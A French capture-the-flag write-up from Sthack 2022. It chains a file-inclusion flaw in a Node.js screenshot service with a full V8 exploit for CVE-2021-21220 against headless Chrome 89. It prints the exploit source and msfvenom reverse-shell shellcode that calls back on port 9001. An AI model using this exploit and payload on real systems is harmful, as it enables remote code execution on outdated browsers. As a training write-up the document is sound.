---
layout: post
title: Headless Updateless Brainless
category: Sthack-2022
---


# Headless Updateless Brainless

Lors de l'accès au challenge, une page d'accueil est présentée.

![img_1.png](/assets/img/sthack2022/updateless/img_1.png)

Nous constatons que le fichier index.html est indiqué en pramètre GET de l'URL et soupçonnons donc la présente d'une faille de type LFI.
Nous tentons d'inclure le fichier /etc/passwd.

![img_2.png](/assets/img/sthack2022/updateless/img_2.png)

Nous constatons que l'inclusion de fichier est possible.
Nous récupérons ensuite la commande exécutée pour lancer le serveur Web grâce à fichier `/proc/self/cmdline`.

![img_3.png](/assets/img/sthack2022/updateless/img_3.png)

Nous constatons que l'application est une application NodeJS et que le code source est présent dans un fichier chall.js.
Nous obtenons ensuite le code source de l'application.

![img_4.png](/assets/img/sthack2022/updateless/img_4.png)

```js
#!/usr/bin/env node

const http = require('http');
const fs = require('fs');
const puppeteer = require("/usr/src/app/node_modules/puppeteer");
const path = require('path');

async function takeScreenshot(url) {
    const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'], }); // Docker all the way!
    const page = await browser.newPage();
    await page.goto(url);
    url_path = url.replace("/", "_");
    await page.screenshot({ path: "screens/" + url_path });
    await browser.close();
}

/** handle GET request */
async function coolHandler(req, res, reqUrl) {
    console.log("reqUrl", reqUrl);
    url = reqUrl.searchParams.get("url");
    url = (url || "").trim().toLowerCase();
    if (url.startsWith("http")) {
        filepath = await takeScreenshot(url);
        res.writeHead(200);
        res.write('Work done: ', filepath);
        res.end();
        return;
    } else {
        res.writeHead(500);
        res.write('Me no Worky :<');
        res.end();
        return;
    }
}

/** handle GET request */
async function displayHandler(req, res, reqUrl) {

    console.log("reqUrl", reqUrl);
    file_path = (reqUrl.searchParams.get("file") || "").trim();
    if (file_path.length == 0 || file_path.toLowerCase().includes("flag")) {
        res.writeHead(302, { 'Location': '/?file=index.html' });
        res.end();
        return;
    }
    try {
        const data = fs.readFileSync(file_path, 'utf8');
        res.writeHead(200);
        res.write(data);
        res.end();
        return;
    } catch (err) {
        console.log(err);
        res.writeHead(404);
        res.write("File doesn't exist or can't be read :(");
        res.end();
        return;
    }
}

let base_url = "http://0.0.0.0/";

http.createServer((req, res) => {
    // create an object for all redirection options
    const router = {
        'GET/coolish-unguessable-feature': coolHandler,
        'default': displayHandler
    };
    // parse the url by using WHATWG URL API
    let reqUrl = new URL(req.url, base_url);
    // find the related function by searching "method + pathname" and run it
    let redirectedFunc = router[req.method + reqUrl.pathname] || router['default'];
    redirectedFunc(req, res, reqUrl);
}).listen(80, () => {
    console.log('Server is running at ' + base_url);
});

```

Nous constatons que la route "coolish-unguessable-feature" accepte un paramètre GET appelé "url" et prend une capture d'écran de la page indiquée en paramètre.
Nous notons que la sandbox de Puppeteer est désactivée.

Nous tentons donc d'indiquer une URL nous appartenant afin d'observer le User-Agent faisant la requête.
Nous recevons une requête.

![img_5.png](/assets/img/sthack2022/updateless/img_5.png)

Celle-ci provient du navigateur Chrome, dans son mode headless et dans la version 89.0.4389.72, qui est obsolète.
Nous cherchons donc si cette version est exposée à des vulnérabilités connues.

![img_6.png](/assets/img/sthack2022/updateless/img_6.png)

Nous constatons que cette version est exposée à différentes vulnérabilités connues.
La vulnérabilité qui nous intéresse est l'exécution arbitraire de code.
Celle-ci correspond à la CVE-2021-21220.

Nos recherches de POC nous indiquent qu'un exploit est disponible sur metasploit. Ne disposant pas d'un serveur accessible depuis Internet ayant Metasploit, nous récupérons le code source de l'exploit.

```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_main_func = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var shellcode = new Uint8Array([#{shellcode}]);
var shellbuf = new ArrayBuffer(shellcode.length);
var dataview = new DataView(shellbuf);

function ftoi(val) {
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

const _arr = new Uint32Array([2**31]);

function foo() {
	var x = 1;
	x = (_arr[0] ^ 0) + 1;

	x = Math.abs(x);
	x -= 0x7FFFFFFF;
	x = Math.max(x, 0);

	x -= 1;
	if(x==-1) x = 0;

	var arr = new Array(x);
	arr.shift();
	var cor = [1.1, 1.2, 1.3];

	return [arr, cor];
}

for(var i=0;i<0x3000;++i)
	foo();

var x = foo();
var arr = x[0];
var cor = x[1];

const idx = 6;
arr[idx+10] = 0x4242;

if (cor.length == 3) location.reload();

function addrof(k) {
	arr[idx+1] = k;
	return ftoi(cor[0]) & 0xffffffffn;
}

function fakeobj(k) {
	cor[0] = itof(k);
	return arr[idx+1];
}

var arr2 = [cor[3], 1.2, 2.3, 3.4];
var fake = fakeobj(addrof(arr2) + 0x20n);

function arbread(addr) {
	if (addr % 2n == 0) {
		addr += 1n;
	}
	arr2[1] = itof((2n << 32n) + addr - 8n);
	return (fake[0]);
}

function arbwrite(addr, val) {
	if (addr % 2n == 0) {
		addr += 1n;
	}
	arr2[1] = itof((2n << 32n) + addr - 8n);
	fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr, shellcode) {
	let buf_addr = addrof(shellbuf);
	let backing_store_addr = buf_addr + 0x14n;
	arbwrite(backing_store_addr, addr);

	for (let i = 0; i < shellcode.length; i++) {
		dataview.setUint8(i, shellcode[i]);
	}
}

var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
copy_shellcode(rwx_page_addr, shellcode);
wasm_main_func();
```

Il nous faut changer le shellcode présent au début de l'exploit par un shellcode permettant d'exécuter un reverse shell vers notre machine.
Nous utilisons pour cela msfvenom.

![img_7.png](/assets/img/sthack2022/updateless/img_7.png)

```js
var shellcode = new Uint8Array([0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x23,0x29,0xc0,0xa8,0x01,0x7c,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0x0f,0x05]);
```

Après transformation et remplacement du shellcode présent dans l'exploit, nous incluons ce code Javascript dans une page HTML que nous hébergeons.
Nous indiquons ensuite l'URL de cette page au service de screenshot et lançons un netcat en écoute sur le port 9001.

Le serveur Web reçoit une requête.

![img_8.png](/assets/img/sthack2022/updateless/img_8.png)

Puis nous obtenons un shell.

![img_9.png](/assets/img/sthack2022/updateless/img_9.png)


